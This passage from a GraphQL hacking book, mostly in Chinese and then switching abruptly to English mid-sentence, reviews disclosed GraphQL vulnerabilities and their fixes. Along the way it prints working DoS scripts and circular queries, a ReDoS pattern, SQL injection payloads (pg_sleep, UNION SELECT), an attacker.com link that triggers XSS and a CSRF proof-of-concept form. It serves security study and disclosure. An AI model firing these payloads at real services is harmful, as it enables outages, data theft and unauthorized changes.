验证 Origin 头对于防止 CSWSH 攻击也至关重要，从黑客的角度来看，测试此验证是否存在绕过是值得的。服务器可能会以奇怪的方式检查头。例如，如果应用程序仅允许 origin *example.com*，攻击者可能会尝试创建一个使用它作为其子域的域，如 *example.com.attacker.net*。如果服务器以天真的方式验证 Origin 头（例如，通过检查字符串 *example.com*），此类攻击可能会通过验证逻辑。

## 总结

在本章中，你了解了影响 GraphQL API 消费者和服务器的攻击。使用基于 GET 和 POST 的 CSRF，攻击者可以代表客户端伪造查询和变更。通过使用 CSWSH 劫持 WebSocket 通信，攻击者可以外泄 GraphQL 订阅响应。最后，SSRF 允许攻击者代表服务器伪造请求并可能访问内部资源。





# 10 已披露的漏洞和利用

![](img/2f244b00cd9f8f37cfc22f928aaa471a_272_0.png)

本章致力于探索真实世界的黑客报告。这些此前发现的 GraphQL 漏洞和利用将强化本书的部分经验教训，并希望能激发你进行自己的安全研究。

在整本书中，你已经学习了在实验室环境中测试 GraphQL API 的许多方法。但在真实场景中，你可能会遇到针对你进行测试的应用独有的漏洞。在本章中，你将发现某些漏洞可能有多么具体。每当你学习一项新技术时，回顾公开可用的黑客报告都有诸多优势。本章将很有用，因为你将发现以下内容：

- 社区其他人提供的新黑客技术
- 其他黑客公开披露漏洞的方法，包括其报告的技术深度，以及如何与外部公司沟通、评估漏洞的严重性并证明其实际业务影响
- 识别公司最关心的软件弱点的方法
- 真实 GraphQL 应用的设计和实现，以及公司在其生产环境中定期处理的漏洞类型
- 公司对漏洞缓解的方法，因为为软件安全缺陷找到长期缓解策略与知道如何破坏软件一样重要

正如你将看到的，每当你学习新东西时，有很大可能其他人已经做了一些工作，可以让你领先一步。

## 拒绝服务

在本节中，我们将回顾公开披露的报告，这些报告对众多公司（其中一些你甚至可能熟悉）的 API 造成了 DoS 影响。记住第 5 章中提到的内容，DoS 漏洞在 GraphQL 中相当常见，这是因为查询语言的强大功能。让我们探索这些问题对服务器可能造成多大的影响。

### 大型负载（HackerOne）

HackerOne 的漏洞赏金平台在其生产环境中大量使用 GraphQL。除了托管其他公司的漏洞赏金计划外，它还运行自己的计划，黑客可以使用该计划披露在平台中发现的安全问题。

> NOTE 你可以在 https://hackerone.com/security 找到 HackerOne 计划。

2020 年 5 月，一名黑客披露了此类漏洞（https://hackerone.com/reports/887521）。他们发现，尽管 HackerOne 文档表明 API 的查询输入存在字符限制，但实际上并未执行此限制。

为了测试该漏洞，黑客编写了一个基于 Python 的利用脚本（包含在报告中），执行以下操作：

- 1. 设置必要的 HTTP 请求信息，例如 cookie 和授权头。
- 2. 初始化一个空字符串变量 a。
- 3. 执行 15,000 次的 for 循环并向 a 添加一个字符字符串，有效地创建了一个 15,000 个字符的字符串。
- 4. 执行另一次 50 次的 for 循环以发送使用 CreateStructuredScope 字段的 mutation 查询。此字段使用前一步构建的有效负载 10 次，有效地为字段的 instruction 参数提供一个包含 150,000 个字符的值。

5. 输出服务器返回对客户端查询响应的耗时。此值用作衡量查询对服务器可能性能影响的指标。响应时间越慢，服务器性能下降就越明显。

以下是利用脚本中使用的 mutation 的片段。利用脚本构建的大型负载作为 mutation 的一部分替换 $instruction 占位符：

```
--snip--
mutation ($eligible_for_submission: Boolean, $instruction: String)
{
  createStructuredScope(input: {$eligible_for_submission, instruction: $instruction})
  {
    --snip--
  }
}
--snip--
```

向服务器发送此 mutation 证明是有效的。在黑客发送了几个此类请求后，GraphQL 服务器开始出现困难，返回 HTTP 服务器错误 500 Internal Server Error、502 Bad Gateway 和 504 Gateway Timeout，有效地造成了 DoS。500 级别的 HTTP 响应代码是服务器端错误，表示代理或服务器出现问题。

请记住，DoS 漏洞不一定需要完全使服务器离线才能生效。它们也可以消耗大量资源，导致明显的性能下降。

HackerOne 为负责任披露此报告的黑客授予了 2,500 美元的赏金。

### 正则表达式（CS Money）

第 5 章未涵盖的一种 DoS 形式使用正则表达式（regex）。正则表达式 DoS（ReDoS）通过迫使服务器处理一个恶意的正则表达式模式来耗尽服务器，其评估消耗大量时间和资源。这些漏洞并非特定于 API，尽管它们可能存在于所有 API 技术中，包括 REST、SOAP 和 GraphQL。

ReDoS 漏洞可能以各种方式发生：

- 客户端将恶意正则表达式模式作为输入提供给服务器。
- 服务器包含一个正则表达式逻辑模式，当提供匹配输入时可能导致无限评估，并且客户端提供了此类输入。如果输入异常大，则可能发生 ReDoS。

这里有一个可能容易受到 ReDoS 攻击的正则表达式模式示例：(a+)+。此模式可以匹配包含任意数量字母 a 的任何字符串，例如 aaaaaaaaaaaaaaaaaaaa。如果客户端发送了 100,000 个 a 字符的大型负载，服务器在模式被评估时可能会变慢。

你可以使用在线正则表达式测试网站，如 https://regex101.com 来查看特定表达式在实践中的行为，如图 10-1 所示。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_275_0.png)

图 10-1：https://regex101.com 上的在线正则表达式测试器

2020 年 10 月，一个化名为 mvm 的道德黑客向 CS Money 的漏洞赏金计划报告了 GraphQL API 中的 ReDoS 漏洞（https://hackerone.com/reports/1000567）。黑客发现 GraphQL search 对象接受一个 q（query）参数。在他们的测试中，他们将 Unicode 空值（\u0000）插入为其值：

```
query {
  search(q: "\u0000", lang: "en") {
    --snip--
  }
}
```

作为对该查询的响应，GraphQL API 服务器返回了一个有趣的错误，揭示了一些对于识别 ReDoS 漏洞存在至关重要的信息：

```
"errors": [
  {
    "message": "value (?.*\u0000) must not contain null bytes"
    --snip--
  }
]
```

正如你所见，通过 q 参数提供的字符串被插入到服务器上的正则表达式匹配逻辑中，由响应中前面的 (?=.* 字符串所示。服务器可能使用此参数在数据库中搜索相关数据。

方便的是，服务器已通过其 extensions 启用了查询追踪。查询追踪允许 GraphQL 服务器返回用于调试的有用响应元数据，并提供有关查询性能的信息。响应中的追踪信息向客户端披露了三个有用的字段（startTime、endTime 和 duration），揭示了服务器处理查询所花费的时间：

```
"extensions": {
  "tracing": {
    "startTime": "02:07:55.251",
    "endTime": "02:07:55.516",
    "duration": 264270190,
    --snip--
  }
}
```

这些字段也表明，有时看似无害的信息可以帮助我们在渗透测试期间。始终查看细节。
在识别出潜在漏洞后，黑客随后使用了一个恶意的正则表达式模式并将其设置为 q 参数的值：

```
query {
  search(q: "[a-zA-Z0-9]+\\s?+$|^([a-zA-Z0-9-'.\\w\\W]+\\s?)+$\\", lang: "en"){
    --snip--
  }
}
```

此模式将匹配 a 到 z、A 到 -Z 和 0 到 9 范围内的任何字符。

> NOTE
> 要获取此模式的完整解释，请将其插入到在线正则表达式评估器中，例如 https://regex101.com，它将提供详细的解释说明其作用。

这里最重要的收获是，此模式很可能匹配应用程序后端数据库中的许多字符串，导致服务器处理（并可能返回）大量数据。在他们的报告中，黑客分享了一个使用 GraphQL 查询的 proof-of-concept cURL 命令。他们表明，通过运行 100 次，他们能够完全关闭 GraphQL 服务器。

正如你所见，恶意负载可以关闭服务器。我们强烈不建议在未经公司明确授权的情况下向公司的生产 API 发送恶意负载，因为如果公司无法处理恶意负载，它们可能会对业务产生负面影响。

公司为此报告授予了 250 美元的赏金。

### 循环自省查询（GitLab）

以下漏洞于 2019 年 7 月报告给 GitLab（https://gitlab.com/gitlab-org/gitlab/-/issues/30096）。此漏洞利用了 GraphQL 自省查询中 type 和 field 字段之间的循环关系。





记者，其 handle 为 freddd，识别出可以通过使用 __schema meta-field 调用 types，然后递归调用 fields 和 type 来触发 DoS 条件：

```
query {
  __schema {
    types {
      fields {
        type {
          fields {
            type {
              --snip--
            }
          }
        }
      }
    }
  }
}
```

此查询依赖于 API 上启用了 introspection。当 introspection 被禁用时，通常无法直接调用 __schema meta-field。

尽管 GitLab 已实施查询复杂度检查以减轻基于循环查询的 DoS 攻击，但该控制不适用于 introspection 查询，从而使其无意中仍然存在漏洞。

利用此漏洞也不要求黑客对 GraphQL API 进行身份验证。身份验证的缺失使其更严重，因为它降低了能够利用它的人的门槛。

## 别名用于字段重复（Magento）

Magento 是互联网上最受欢迎的电子商务平台之一，使用 GraphQL，并且在 2021 年 4 月，该平台受到了 DoS 漏洞的影响。使用字段重复，攻击者可以在未经身份验证的情况下耗尽服务器资源。（Magento 允许未经身份验证的客户端使用某些 GraphQL 对象，而其他对象则需要有效的经过身份验证的会话。）

我们，本书的作者，发现 Magento 没有对其自身进行保护，以防止恶意查询多次重复字段。我们使用了以下查询作为概念验证：

```
query {
  alias1: countries {
    full_name_english
    full_name_english # continues 1000s of times
    --snip--
  }
  alias2: countries {
    --snip--
  }
}
```

```
alias3: countries {
  --snip--
}
}
```

此查询使用 GraphQL 别名作为一种方法，在单个 HTTP 请求中批量重复查询，这种技术允许攻击者向服务器发送非常复杂的查询。由于缺乏安全控制，例如查询成本限制，它有效地耗尽了服务器的资源。

Magento 此后已在其平台中引入了许多 GraphQL 安全功能，例如 GraphQL 查询复杂度限制和查询深度分析。图 10-2 显示了 Magento 在其 API 中实施的安全控制的默认值。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_278_0.png)

图 10-2：Magento 查询复杂度和查询深度控制的默认值

正如你所见，Magento 已实施了 queryComplexity 值为 300 和 queryDepth 值为 20，这意味着查询的复杂度不能超过 300，循环查询的嵌套层数不能超过 20 级。

## 基于数组的批处理用于字段重复（WPGraphQL）

此漏洞与我们之前讨论的字段重复漏洞非常相似。在 2021 年 4 月，WPGraphQL，一个用于 WordPress 的 GraphQL 插件（https://www.wpgraphql.com），由于缺乏适当的安全控制和不安全默认配置而遭受了 DoS 漏洞。

WPGraphQL 插件为任何 WordPress 内容管理系统提供生产就绪的 GraphQL API，并且可通过 WordPress 插件市场获得。图 10-3 显示了此插件。

默认情况下，WPGraphQL 基本上使任何安装了该插件的 WordPress 实例都容易受到 DoS 攻击。首先，它允许客户端使用基于数组的批处理在单个请求中批处理多个查询。此外，插件对恶意查询的保护有限。第三，由于 WordPress 是一个经常为未经身份验证的客户端（例如博客读者）提供服务的博客平台，API 的某些功能部分可以在没有特殊权限的情况下访问。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_279_0.png)

图 10-3：用于 WordPress 的 WPGraphQL 插件

我们自己发现了此漏洞并发布了以下利用代码：

```
--snip--
FORCE_MULTIPLIER = int(sys.argv[2])
CHAINED_REQUESTS = int(sys.argv[3])

--snip--
queries = []

payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
query = {'query':'query { \n posts { \n nodes { \n ' + payload + ' } } }'}

for _ in range(0, CHAINED_REQUESTS):
    queries.append(query)

r = requests.post(WORDPRESS_URL, json=queries)
print('Time took: {}'.format(r.elapsed.total_seconds()))
```

此代码设置了两个变量，这些变量本质上定义了单个 HTTP 请求的复杂性：FORCE_MULTIPLIER 是一个整数变量，用于重复字段的选择集，CHAINED_REQUESTS 保存了利用程序将添加到批处理数组中的元素数量。

接下来，queries 变量被设置为空数组。此变量将保存最终发送到 WPGraphQL 的完整恶意负载。代码随后创建一个特殊查询，该查询将由分配给 FORCE_MULTIPLIER 变量的整数值重复，并将其制作成 HTTP 请求的查询 JSON 对象。接下来，循环运行 N 次，其中 N 是 CHAINED_REQUESTS 的值。如果 CHAINED_REQUESTS 设置为 100，循环将运行 100 次并创建一个包含 100 个元素的数组。最后，

利用程序发送 HTTP 请求并计算服务器响应昂贵查询所需的时间。

简而言之，如果 FORCE_MULTIPLIER 和 CHAINED_REQUESTS 都设置为 100，最终数组将包括 100 个查询，每个查询包含 100 个重复字段。想象一下，如果这两个变量设置为 10,000，这种查询的处理会多么昂贵。

> NOTE 自披露以来，WPGraphQL 已对插件进行了重大的安全改进，并解决了此 DoS 漏洞。

## 循环片段（Agoо）

我们在 2022 年 5 月在名为 Agoo 的基于 Ruby 的 GraphQL 服务器实现中发现了一个循环片段漏洞。由 CVE-2022-30288 识别，该漏洞源于 Agoo 服务器级别上对传入查询的验证检查缺失。这种验证失败意味着服务器不符合规范。它还意味着发送到 Agoo 服务器的查询可以通过多种方式使其崩溃。让我们探讨一下我们如何使用循环片段做到这一点。

作为第一步，我们想检查 introspection 是否默认启用，因此我们运行了以下查询：

```
query Introspection {
  __schema {
    directives {
      name
    }
  }
}
```

此查询很简单；它返回模式中所有指令的名称。当你还不知道 GraphQL 服务器支持哪些操作时，这是一个很好的查询。

接下来，我们使用引用查询的片段构建了一个循环查询：

```
query CircularFragment {
  __schema {
    ① ...A
  }
}

fragment A on __Schema {
  directives {
    name
  }
  ② ...B
}

fragment B on __Schema {
  ③ ...A
}
```

我们创建了两个针对 __Schema 类型的片段。第一个片段 A 使用 directives 顶级字段和 name 字段。它然后在 ② 处调用（或导入）片段 B。片段 B 在 ③ 处包含 …A，这再次调用片段 A。此时，我们有两个循环片段。现在，为了让它们执行，我们需要在查询中使用其中一个。在 ① 处，你可以看到我们如何在 __schema meta-field 内部通过调用 …A 来使用片段 A。

此时，循环条件开始，并且永远不会结束！在 Agoo 上运行此查询将冻结服务器，并且它将不再能够提供查询。恢复它的唯一方法是重新启动 Agoo 的服务器进程。

其中一些 DoS 漏洞是在使用 GraphQL 已有一段时间的知名产品中发现的，证明没有人能免疫漏洞。

## 损坏的授权

在本节中，我们将探讨影响 GraphQL API 中授权控制的漏洞。这些类型的问题最终可能导致数据泄露并允许未经授权访问敏感信息。

### 允许停用用户的数据访问（GitLab）

在一个于 2021 年 8 月公开披露并报告给 GitLab 的漏洞中，一个名为 Joaxcar 的黑客能够通过使用停用的用户帐户对 GraphQL API 进行身份验证并执行不应该被允许的操作来访问数据（https://hackerone.com/reports/1192460）。

停用的用户帐户应该在维护者重新激活之前拒绝其访问。虽然用户被停用时，应用程序应拒绝用户的访问尝试，无论是通过控制台直接还是通过 API 密钥，即使他们拥有活动的 API 密钥。

为了理解这带来的风险，想象一下一名员工休假，安全团队的政策是在他们返回办公室之前禁用所有员工帐户。现在想象一下该员工的密码已泄露到互联网上，并且威胁行为者拥有这些凭据。在我们描述的漏洞场景中，威胁行为者将能够调用应用程序，即使用户的帐户已禁用。如果有适当的身份验证和授权控制，这不应该发生。

以下是 Joaxcar 为利用漏洞所做的事情：

- 1. 作为管理员，使用 API 密钥创建了一个次要用户
- 2. 仍作为管理员，禁用了新创建的用户
- 3. 使用已停用用户的 API 密钥调用 GraphQL API
- 4. 确认他们能够成功地使用已停用用户的凭据执行操作





他们在测试中使用了以下 GraphQL 查询：

```
mutation {
  labelCreate(input:{title:"deactivated", projectPath:"test1/test1"}){
    errors
    label {
      id
    }
  }
}
```

该查询使用带有输入类型参数的 labelCreate 对象，该参数接受 title 和 projectPath。换句话说，此漏洞允许道德黑客使用已停用的账户来创建标签字段。很可能该漏洞也允许执行除创建标签之外的其他操作。

> 注意 用于利用的 API 令牌（代码片段中未显示）作为 Bearer 令牌传递给 Authorization HTTP 头。

## 允许无特权的员工修改客户的电子邮件（Shopify）

以下漏洞由用户 ash_nz 于 2021 年 9 月报告给 Shopify 漏洞赏金计划（https://hackerone.com/reports/980511）。电子商务公司 Shopify 多年来一直是 GraphQL 领域的先行者，开发了有用的开源工具，发布了关于 GraphQL 最佳实践的文章等。

该漏洞允许 ash_nz 使用无特权的商店员工账户修改客户电子邮件，该账户可通过专用的 GraphQL API 突变来更新电子邮件对象。以下是报告中显示的突变：

```
mutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!) {
  emailSenderConfigurationUpdate(input:$input) {
    emailSenderConfiguration {
      id
    }
    userErrors {
      field
      message
    }
  }
}
```

黑客将客户的电子邮件传递给突变的输入参数并发送到 GraphQL API 服务器，后者更新了客户的电子邮件，尽管 API 调用方没有执行此操作的权限。

这是一个相当简单的漏洞，但识别它需要测试多个假设和边界情况。始终使用各种特权级别评估 API，并尝试跨账户或跨用户访问以发现授权问题。

黑客因负责任地披露此问题而从 Shopify 获得了 1,500 美元的赏金。

## 通过团队对象披露允许的黑客数量（HackerOne）

2018 年 4 月，代号为 haxta4ok00 的道德黑客在 HackerOne 中发现了 GraphQL 授权问题，导致信息泄露漏洞（https://hackerone.com/reports/342978）。

黑客发现，通过使用 HackerOne GraphQL API 中的 team 对象进行查询，他们可以访问本不应访问的受限字段。team 对象允许查询 HackerOne 平台上的程序并返回其 id 和 name 等信息。

黑客还发现，当指定 whitelisted_hackers 字段时，它会返回程序允许的黑客数量的 total_count。由于 team 对象接受 handle 参数，因此实际上允许根据 handle 字符串搜索程序。在以下示例中，handle 为 security：

```
query {
    team(handle:"security"){
        id
        name
        handle
        whitelisted_hackers {
            total_count
        }
    }
}
```

HackerOne 分诊团队能够确定，此漏洞也可能允许某人通过向 handle 参数提供各种可能匹配团队 handle 的字符串来识别平台上的其他非公开程序。对查询的响应如下：

```
--snip--
"team":{
    "id":"Z2lkOi8vaGFja2Vybz5l1R1YwovMTM=",
    "name":"HackerOne",
    "handle":"security",
    "whitelisted_hackers":{
        "total_count":30
    }
}
--snip--
```

正如您所见，所披露的信息本质上并不敏感，但可用于推断程序是否私有，从而找到 HackerOne 的客户。

HackerOne 因信息泄露影响而为此授权问题支付了 2,500 美元的赏金。

## 读取私有笔记（GitLab）

GitLab 上创建的问题可能包含只有成员才能查看的私有笔记。2019 年 6 月，代号为 ngalog 的道德黑客通过 HackerOne 报告（https://hackerone.com/reports/633001）报告了 CVE-2019-15576，显示黑客可以通过 GitLab 的 GraphQL API 读取这些笔记，尽管它们在 REST API 中已正确受限。

笔记可能很敏感，因为它们可能包含有关重复问题、问题移至另一个项目的信息，甚至项目代码。道德黑客使用以下查询来利用该漏洞：

```
query {
  project(fullPath:"username16/ci-test"){
    issue(iid:"1"){
      descriptionHtml
      notes {
        edges {
          node {
            bodyHtml
            system
            author {
              username
            }
            body
          }
        }
      }
    }
  }
}
```

正如您所见，issue 对象与 notes 字段一起使用。此 notes 字段允许访问其他字段，例如笔记正文、笔记作者等。图 10-4 中的屏幕截图取自 GitLab GraphQL API 文档，显示了可用字段的完整列表。

| Fields |  |  |
| Name | Type | Description |
| author | UserCore! | User who wrote this note. |
| body | String! | Content of the note. |
| bodyHtml | String | The GitLab Flavored Markdown rendering of note. |
| confidential | Boolean | Indicates if this note is confidential. |
| createdAt | Time! | Timestamp of the note creation. |
| discussion | Discussion | Discussion this note is a part of. |
| id | NoteID! | ID of the note. |

图 10-4：GitLab 的 note 字段文档

完整的 GitLab GraphQL API 文档可在 https://docs.gitlab.com/ee/api/graphql/reference 找到。

## 披露付款交易信息（HackerOne）

以下漏洞于 2019 年 10 月报告给 HackerOne，影响了其自身的 GraphQL API（https://hackerone.com/reports/707433）。它允许发现并披露该问题的黑客 msdian7 访问付款交易总数的信息——该信息本应保密且仅限授权方访问。

使用的 GraphQL 查询如下所示：

```
query ($handle_0: String!, $size_1: ProfilePictureSizes!) {
  team(handle: $handle_0) {
    id
    name
    about
    profile_picture(size: $size_1)
    offers_swag
    offers_bounties
    base_bounty
    payment_transactions {
      total_count
    }
  }
}
```

> 注意 报告中的原始查询使用了 GraphQL 片段。为简洁起见，我们将片段与查询合并。

付款数据绝不应该是公开信息。此漏洞允许通过 payment_transactions 字段访问 total_count 字段，使用未经授权的会话，从而有效地提供了对 HackerOne 平台上其他漏洞赏金计划所进行的交易情况的洞察。

## 信息披露

在本节中，我们将回顾公开披露的仅导致信息泄露问题的漏洞。我们在本章前面讨论的一些问题也导致了信息泄露结果，尽管这些源于其他漏洞，例如破坏的访问控制机制。

## 枚举 GraphQL 用户（GitLab）

2021 年，Rapid7 在 GitLab 社区版和企业版中发现了 CVE-2021-4191。该漏洞允许未经身份验证的攻击者访问已通过 users 字段特别限制其用户注册界面的私有 GitLab 实例中的用户信息。

例如，以下查询返回 GitLab 实例中用户的信息，例如其姓名、用户名和 ID：

```
query {
  users {
    nodes {
      id
      name
      username
    }
  }
}
```

除了用户的姓名和用户名外，该漏洞还影响了其电子邮件、位置、用户权限、群组成员身份、状态和个人资料图片等字段。拥有如此多关于用户的信息有多种用途：

- 识别攻击账户。了解用户名和电子邮件允许威胁行为者针对特定账户。访问用户电子邮件还允许威胁行为者转向其他攻击，例如通过向用户发送钓鱼邮件进行社会工程。
- 识别可用群组。该漏洞允许攻击者通过其群组成员身份推断运行 GitLab 的公司信息。群组成员身份可以揭示有关收购、子公司、其他公司分支、公司运营地区等信息。
- 识别个人。该漏洞允许访问个人资料图片，这可以帮助威胁行为者在 GitLab 外的平台上针对特定用户。
- 识别账户状态。知道账户状态（是否已禁用或启用）可以使暴力破解等攻击更有效；威胁行为者可以仅针对处于启用状态的账户，从而优化其攻击。





这个漏洞之所以特别有趣，是因为它利用起来非常简单直接。能够以未认证的方式进行攻击，也大大增加了其严重性。

## 通过 WebSocket 访问内省查询（Nuri）

这是一份有趣且相当独特的报告。2020 年 4 月，一位化名为 zerodivisi0n 的道德黑客披露了 Nuri API 中的一个漏洞，导致通过内省查询泄露了模式信息（https://hackerone.com/reports/862835）。该 GraphQL API 使用 WebSocket 作为传输协议，而不是 HTTP。

在前面的章节中，你已经在订阅操作的上下文中了解了 GraphQL 和 WebSocket；客户端可以通过 WebSocket 协议订阅某些感兴趣的事件以获取实时信息。某些 GraphQL 库，例如 graphql-ws（https://github.com/enisdenjo/graphql-ws），不仅允许通过 WebSocket 发送订阅，还允许发送查询和变更。

所报告的漏洞使黑客能够直接通过 WebSocket 连接执行内省查询。虽然报告中并没有详细介绍 GraphQL 实现的设计方式，但内省在非基于 WebSocket 的接口上是被禁用的，例如通过 HTTP 发送的查询操作。

通过 WebSocket 客户端到服务器消息的内省查询可能如下所示：

```
{"type":"start","payload":{"query":"query Introspection { __schema {...} }"}}
```

通过 WebSocket 发送的查询和变更操作目前并不常见。你更有可能看到 GraphQL 订阅操作通过 WebSocket 传输，但随着 GraphQL 趋势的发展，这可能会随时间而改变。

## 注入

以下公开披露的 GraphQL 漏洞导致了应用注入缺陷。第 8 章介绍了注入以及如果被利用会产生多大的影响。

## GET 查询参数中的 SQL 注入（HackerOne）

2018 年 11 月，Jobert 在 HackerOne 的 GraphQL 生产端点中发现了一个 SQL 注入（https://hackerone.com/reports/435066）。Jobert 发现了一个传递给 HackerOne GraphQL /graphql 端点的非标准参数 embedded_submission_form_uuid，看起来如下：

/graphql?embedded_submission_form_uuid=value

该 URL 参数在 GraphQL API 中并不标准，你更有可能看到以下参数：

- query
- variables
- operationName

你应该已经熟悉这些：query 采用其值作为完整的 GraphQL 查询，variables 采用传递给查询的额外数据（例如参数值），operationName 是操作的名称。Jobert 能够确定传递给自定义参数的值在后端未被检查，从而有效地允许他们注入 SQL 命令。

HackerOne 的分诊团队分享了负责处理 GraphQL 参数的 Ruby 代码，我们在此对其进行了修改以使问题更明显：

```
unless database_parameters_up_to_date
  safe_query = ''

  ① new_parameters = {"embedded_submission_form_uuid":"PAYLOAD"}

  new_parameters.each ② do |key, value|
    safe_query += "SET SESSION #{key} TO #{value};"
  end

  begin
    # safe_query ="SET SESSION embedded_submission_form_uuid TO PAYLOAD"
    connection.query(safe_query)
  rescue ActiveRecord::StatementInvalid => e
    raise e unless e.cause.is_a? PG::InFailedSqlTransaction
  end

end
```

new_parameters 变量 ① 是一个哈希映射，包含自定义的 embedded_submission_form_uuid URL 参数及其值（由客户端控制）。在 ② 处，一个循环对分配给该变量的键和值执行字符串插值，有效地将参数及其值组合成一个字符串。它将此字符串与 SET SESSION SQL 命令组合。

新的 SQL 命令最终被分配给 safe_query 变量，此时攻击者可以无需任何检查对其进行控制。我们使用注释突出显示了分配给该变量的值：GET 参数 embedded_submission_form_uuid 键及其值。该变量最终被转换为 SQL 查询并执行。GraphQL 参数也不会自动进行清理，这也促成了 SQL 注入条件。

Jobert 制作了一个特殊的 cURL 请求来验证注入：

```
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=\n1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27

0.02s user 0.01s system 0% cpu 10.557 total
```

此 cURL 请求的 URL 解码版本如下所示：

/graphql?embedded_submission_form_uuid=1';SELECT 1;SELECT pg_sleep\(10\);--'

该请求使用基于时间的 SQL 注入技术（第 8 章中介绍）通过使用 PostgreSQL 命令 pg_sleep 在服务器处理中引入了 10 秒的时间延迟。然后攻击者使用 Linux time 命令跟踪服务器响应请求所需的时间。完成耗时 10.557 秒。

该技术不仅证实了漏洞的存在，而且避免了意外泄露敏感信息或向数据库发送可能导致数据丢失的危险命令。

## 对象参数中的 SQL 注入（Apache SkyWalking）

Apache SkyWalking 是由 Apache 软件基金会创建的面向微服务和云原生架构的性能监控平台。2020 年 6 月，它因通过传递给 GraphQL 字段参数的值而引入的 SQL 注入漏洞而受损。该漏洞被分配了标识符 CVE-2020-9483。

SkyWalking 可以使用各种存储后端，例如 H2、OpenSearch、PostgreSQL 和 TiDB。一位化名为 Jumbo-WJB 的黑客发现，当 SkyWalking 与 H2 或 MySQL 存储后端一起使用时，它容易通过 getLinearIntValues 字段 metric 参数进行 SQLi。

Jumbo-WJB 发布了该漏洞的利用代码，在 GraphQL 查询中构造了一个特殊有效负载，利用该漏洞实现 SQLi。在以下示例查询中，你可以看到作为输入传递给 metric 参数的 id 的值包含 SQL 查询语法：

```
query SQLi($d: Duration!) {
  getLinearIntValues(metric:
  {name: "all_p99", id: "') UNION SELECT 1,CONCAT('~', '9999999999', '~')--"},
  duration: $d) {
    values {
      value
    }
  }
}
```

对于一个值，metric 参数期望一个包含 id 和 name 等键的对象。该漏洞似乎出现在 id 键中，该键在插入 H2 或 MySQL 数据库之前未经过清理。

NOTE 该漏洞的完整利用代码可以在 Nuclei 漏洞扫描器项目的公共存储库中找到，地址为 https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-9483.yaml。

通过检查包含修复的 SkyWalking GitHub 仓库的拉取请求，我们可以了解易受攻击的代码区域可能是什么样子（图 10-5）。

```
110 public IntValues getLinearIntValues(String tableName, DownSampling downsampling, List<String> ids,
111 String valueCName) throws IOException {
112 - StringBuilder idValues = new StringBuilder();
113 - for (int valueIdx = 0; valueIdx < ids.size(); valueIdx++) {
114 - if (valueIdx != 0) {
115 - idValues.append(",");
116 }
117 - idValues.append("'").append(ids.get(valueIdx)).append("'");
118 }
119 
120 IntValues intValues = new IntValues();
121 
122 try (Connection connection = h2Client.getConnection()) {
123 
124 try (ResultSet resultSet = h2Client.executeQuery(
125 - connection, "select id, " + valueCName + " from " + tableName + " where id in (" + idValues.toString() + ")") {
```

图 10-5：Apache SkyWalking 的易受攻击代码

getLinearIntValues 方法接受一些参数，例如 tableName、valueCName 和 ids（第 110 行），并使用 Java 的 StringBuilder 进行一些字符串构建（第 112 行）。然后使用循环遍历传递给 ids 参数的值并通过连接它们并使用单引号装饰它们来构造一个字符串（第 113 至 118 行）。新构建的字符串最终被用作 SQL 查询的一部分而未进行清理（第 123 至 125 行）。

metric 对象的 id GraphQL 参数很可能直接插入到 ids 列表中，因此允许注入 SQL 命令。

## 跨站脚本（GraphQL Playground）

CVE-2021-41249 是影响 GraphQL Playground IDE 的反射型 XSS 漏洞，该 IDE 提供了发送查询到 API 的界面，以及原始模式信息、有关 API 功能的文档以及从内联 SDL 代码注释中获取的信息。此信息部分由在 GraphQL Playground 加载时自动发送的内省查询填充。其他信息可能来自 GraphQL 服务器。

与本章迄今为止介绍的漏洞相比，此漏洞相当不同。首先，它直接影响 API 消费者，因为成功的



exploitation would execute in their browser. Second, attackers could exploit it in two ways:

- By compromising a GraphQL server and modifying its schema to include dangerous characters.
- By building a custom GraphQL server with a malicious payload implemented. The attacker could then target the client by sending them a link to load the GraphQL Playground with the malicious server’s address—for example, http://blackhatgraphql.com/graphql?endpoint=http://attacker.com/graphql?query={__typename}. If the victim clicks the link, their browser will automatically load the malicious API and run a query on their behalf, which executes the payload into the Playground running in their browser and triggers the XSS.

Let’s explore how a GraphQL server could serve such malicious payloads. Consider the following code sample from DVGA:

```
class UserObject(SQLAlchemyObjectType):
    class Meta:
        name = "MyMaliciousTypeName"
        model = User
```

This code represents DVGA’s UserObject object. Developers could use the name variable to rename an object’s name to a custom string, and a threat actor could do the same if they’ve compromised the server (or simply hosted their own version of it). This name will then get rendered in an IDE tool’s documentation section (Figure 10-6).

![](img/2f244b00cd9f8f37cfc22f928aaa471a_291_0.png)

Figure 10-6: A malicious type name shown in a search

When a client opens the GraphQL Playground to query the API, the malicious JavaScript payload will be rendered in their browser, which, in this case, is injected into a type’s name.

This exact vulnerability existed in the Playground Node Package Manager (npm) package graphql-playground-react. In late 2021, the library maintainers took the following steps to remediate the vulnerability:

- Ensuring that any HTML text is escaped
- Ensuring that type names conform to the GraphQL specification
- Avoiding loading the documentation section if it contains dangerous characters
- Ensuring that user-generated HTML is checked and made safe

GraphQL IDEs are popular, so if you’re performing a penetration test and identify an old version of GraphQL Playground, it’s possible that it hasn’t been patched and is still vulnerable to this XSS. Alternatively, you could host your own malicious GraphQL server containing the vulnerable Playground library and trick a victim into visiting it.

## Cross-Site Request Forgery (GitLab)

Earlier in the book, we highlighted techniques for identifying GraphQL APIs that allow GET-based queries. Let’s now see how a hacker was able to abuse this functionality. In March 2021, the hacker az3z3l disclosed a CSRF vulnerability to GitLab (https://hackerone.com/reports/1122408).

When handling GraphQL queries over the POST method, GitLab uses a special X-CSRF-Token HTTP header to protect against CSRF attacks. This header includes a unique token in each request or query.

GET requests aren’t typically used for actions such as data modifications, so companies don’t usually protect them with anti-CSRF tokens. But because GitLab supported queries using GET, the CSRF protection in place did not apply to those queries, even though these operations included queries and mutations and had the ability to perform changes through the API.

Ethical hacker az3z3l provided proof-of-concept HTML code that abuses the CSRF vulnerability:

```
--snip--
<form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET"> ①
<input name="②" "query" value="mutation CreateSnippet($input: CreateSnippetInput!) --snip--">
<input name="③" "variables" value='{"input":{"title":"Tesssst Snippet"} --snip--'>
</form>
--snip--
